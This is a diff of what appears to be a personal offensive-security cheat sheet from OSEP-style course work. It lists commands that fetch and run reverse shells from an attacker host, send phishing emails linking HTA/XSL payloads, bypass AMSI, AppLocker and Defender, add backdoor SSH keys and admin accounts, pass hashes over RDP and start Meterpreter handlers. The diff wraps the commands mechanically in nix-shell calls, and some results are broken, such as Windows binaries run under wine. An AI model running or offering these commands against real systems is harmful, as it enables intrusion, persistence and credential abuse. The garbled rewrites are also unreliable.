@@ -18,10 +18,10 @@ Copy to VSCode and format
 Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,IsTamperProtected,AntivirusSignatureLastUpdated
 
 # Linux process monitoring
-curl http://<ip>:<port>/ps/pspy64 -o ./pspy64 ; chmod +x ./pspy64 ; ./pspy64
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://<ip>:<port>/ps/pspy64 -o ./pspy64 ; chmod +x ./pspy64 ; ./pspy64
 
 # Show the whitelisted paths for AV
-reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware\Exclusions\Paths"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#wine -c wine reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware\Exclusions\Paths"
 
 # Test AMSI, is it on?
 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
@@ -30,7 +30,7 @@ reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalw
 $ExecutionContext.SessionState.LanguageMode
 
 # Scan scope.txt
-mkdir nmap ; sudo nmap -v -Pn -sT -sV -O -sC -p- -iL scope.txt -oA nmap/all-port-service-os-script
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c mkdir nmap ; sudo nmap -v -Pn -sT -sV -O -sC -p- -iL scope.txt -oA nmap/all-port-service-os-script
 
 # Am I in CMD or PS?
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
@@ -52,32 +52,32 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<ip>:<port>/pl/<f
 .\DotNetToJScript.exe Z:\source\dll-revshell\bin\x64\Release\dll-revshell.dll --lang=Jscript --ver=v4 -o Z:\DotNetToJscript\demon.js
 
 # Download and run a revshell using MSHTA (CLM bypass)
-cmd.exe /c mshta.exe http://<ip>:<port>/pl/js-revshell.hta
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#wine -c wine cmd.exe /c mshta.exe http://<ip>:<port>/pl/js-revshell.hta
 
 # Download and run a revshell using XSL (CLM bypass)
-cmd.exe /c wmic process get brief /format:"http://<ip>:<port>/pl/js-revshell.xsl"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#wine -c wine cmd.exe /c wmic process get brief /format:"http://<ip>:<port>/pl/js-revshell.xsl"
 
 # Execute a .DLL
-rundll32 C:\Tools\met.dll,run
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#wine -c wine rundll32 C:\Tools\met.dll,run
 
 # Download and drop a revshell (.ELF)
-curl http://<ip>:<port>/pl/li-rshell.elf -o ./li-rshell.elf
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://<ip>:<port>/pl/li-rshell.elf -o ./li-rshell.elf
 
 # Download  and execute an ELF in-memory
 fee rshell > /home/tijmen/pen300/www/pl/demon.py 
-curl http://<ip>:<port>/pl/demon.py | python
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://<ip>:<port>/pl/demon.py | python
 
 # Download and drop a revshell (.SO) for LD_LIBRARY_PATH vulns
-curl http://<ip>:<port>/pl/li-rshell.so -o ./li-rshell.so
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://<ip>:<port>/pl/li-rshell.so -o ./li-rshell.so
 
 # Download and drop a revshell (.SO) for LD_PRELOAD vulns
-curl http://<ip>:<port>/pl/evil_<file> -o ./evil_<file>
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://<ip>:<port>/pl/evil_<file> -o ./evil_<file>
 
 # Send a .HTA payload over E-mail
-swaks --to <receiver-email> --from test@test.test --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.hta"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#swaks -c swaks --to <receiver-email> --from test@test.test --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.hta"
 
 # Send a .XSL payload over E-mail
-swaks --to REPLACE@ME.com --from test@test.test --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.xsl"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#swaks -c swaks --to REPLACE@ME.com --from test@test.test --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.xsl"
 
 # bypass
 # Disable MS Defender (admin needed)
@@ -93,7 +93,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogTo
 $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'
 
 # Bypass AWL using HTA
-mshta.exe bypass.hta
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#wine -c wine mshta.exe bypass.hta
 
 <html>
 <head>
@@ -111,7 +111,7 @@ self.close();
 
 # Bypass AWL using XSL
 Run on Kali:
-vim /www/pl/bypass.xsl
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#vim -c vim /www/pl/bypass.xsl
 
 wmic process get brief /format:"http://<ip>:<port>/pl/bypass.xsl"
 
@@ -162,7 +162,7 @@ $cmd = "cmd /c start powershell.exe" ; New-Item "HKCU:\Software\Classes\ms-setti
 (New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/winPEAS.ps1') | IEX | Out-File -FilePath .\winpeas.txt
 
 # Linux PrivEsc enumeration
-curl http://<ip>:<port>/ps/linpeas.sh | sh | tee ./linpeas.txt
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://<ip>:<port>/ps/linpeas.sh | sh | tee ./linpeas.txt
 
 # Multi PrivEsc enumeration
 run multi/recon/local_exploit_suggester
@@ -203,17 +203,17 @@ Invoke-WebRequest -Uri http://<ip>:<port>/pe/ligolo.exe -OutFile .\ligolo.exe; I
 .\ligolo.exe -connect <ip>:11601 -ignore-cert
 
 # Download ligolo for Linux
-curl http://<ip>:<port>/pe/ligolo.elf -o ./ligolo.elf; chmod +x ./ligolo.elf
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://<ip>:<port>/pe/ligolo.elf -o ./ligolo.elf; chmod +x ./ligolo.elf
 ./ligolo.elf -connect <ip>:11601 -ignore-cert
 
 # Load Ligolo into memory for Windows
 Run on Kali:
-donut -f 1 -o /home/tijmen/pen300/www/pe/ligolo.bin -a 2 -p "-connect <ip>:11601 -ignore-cert" -i /home/tijmen/pen300/www/pe/ligolo.exe ; sed -i 's/[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}:[0-9]\{{1,5\}}/<ip>:<port>/g' /www/ps/Ligolo-AppLockerBypass.ps1
+NIXPKGS_ALLOW_UNFREE=1 nix shell github:esp0xdeadbeef/cheat.sheets#donut -c donut -f 1 -o /home/tijmen/pen300/www/pe/ligolo.bin -a 2 -p "-connect <ip>:11601 -ignore-cert" -i /home/tijmen/pen300/www/pe/ligolo.exe ; sed -i 's/[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}:[0-9]\{{1,5\}}/<ip>:<port>/g' /www/ps/Ligolo-AppLockerBypass.ps1
 
 IEX(new-object system.net.webclient).downloadstring('http://<ip>:<port>/ps/Ligolo-AppLockerBypass.ps1')
 
 # Spawn a meterpreter without a double hop issue
-nxc smb <target> -u USERREPLACE -H HASHREPLACE -d DOMAINREPLACE -X "[run.txt here]"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#netexec -c nxc smb <target> -u USERREPLACE -H HASHREPLACE -d DOMAINREPLACE -X "[run.txt here]"
 
 # Show the PowerShell history of a user
 C:\Users\[REPLACEME]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -238,16 +238,16 @@ Get-SQLServerLinkCrawl -Username USERREPLACE -Password PASSREPLACE -QueryTarget 
 
 # persistance
 # Add pubkey to authorized_keys
-mkdir ~/.ssh/ ; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIbI6f5vDmSzXBNY150yIf3rJG0fR9YNaHT+UIPNLxTF tijmen@NX-76884" >> ~/.ssh/authorized_keys
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c mkdir ~/.ssh/ ; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIbI6f5vDmSzXBNY150yIf3rJG0fR9YNaHT+UIPNLxTF tijmen@NX-76884" >> ~/.ssh/authorized_keys
 
 # Enable RDP on the system
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#wine -c wine reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /
 
 # Enable PtH RDP(admin needed)
 New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
 
 # Connect PtH RDP
-xfreerdp /u:administrator /pth:REPLACEME /v:<target> /size:1920x1080 /cert-ignore
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#freerdp -c xfreerdp /u:administrator /pth:REPLACEME /v:<target> /size:1920x1080 /cert-ignore
 
 # Add Yeri as local admin
 net user yeri P@ssw0rd /add ; net localgroup administrators yeri /add ; net localgroup "remote desktop users" yeri /add
@@ -289,24 +289,24 @@ Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select 
 # metasploit
 # Startup and run
 Deprecated, use resources instead
-sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#metasploit -c sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j"
 
 # Startup and run
 Deprecated, use resources instead
-sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#metasploit -c sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j"
 
 # Startup and run with auto migrate
 Deprecated, use resources instead
-sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#metasploit -c sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j"
 
 # Startup and run with auto migrate
 Deprecated, use resources instead
-sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#metasploit -c sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j"
 
 # others
 # PowerShell prefixes
-powershell -nop -ep bypass -enc <COMMAND>
-powershell -nop -ep bypass -c <COMMAND>
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#powershell -c pwsh -nop -ep bypass -enc <COMMAND>
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#powershell -c pwsh -nop -ep bypass -c <COMMAND>
 
 # Stomping MS-Word
 .\EvilClippy.exe -s fakecode.vba macrofile.doc
@@ -321,10 +321,10 @@ bitsadmin /Transfer myJob http://<ip>:<port>/pe/<file> C:\users\student\enc.txt 
 Get-ChildItem -Path C:\ -Include .config,.txt,.xml,.ini  -File -Recurse -ErrorAction SilentlyContinue | select-string -Pattern "REPLACEME"
 
 # Compile C-code using an old compiler
-docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -z execstack -o evil.elf elf-revshell.c
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#docker -c docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -z execstack -o evil.elf elf-revshell.c
 
 # Improve a Linux shell
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#python3 -c python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 # Replacement for the watch command
 while true; do if [ "$(ls -A | wc -l)" -gt 0 ]; then break; else date; sleep 5; fi; done
@@ -342,7 +342,7 @@ $SecPassword = ConvertTo-SecureString 'PASSWDREPLACE' -AsPlainText -Force ; $Cre
 Import-Module .\Microsoft.ActiveDirectory.Management.dll
 
 # Revshell with oennieshead revshell handler
-msfvenom -p linux/x64/meterpreter_reverse_https lhost=$(ip a s <adapter> | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//g') lport=<port> LURI=$endpoint HttpProxyIE=False -f elf
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#metasploit -c msfvenom -p linux/x64/meterpreter_reverse_https lhost=$(ip a s <adapter> | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//g') lport=<port> LURI=$endpoint HttpProxyIE=False -f elf
 
 # General notes
 ` escapes "
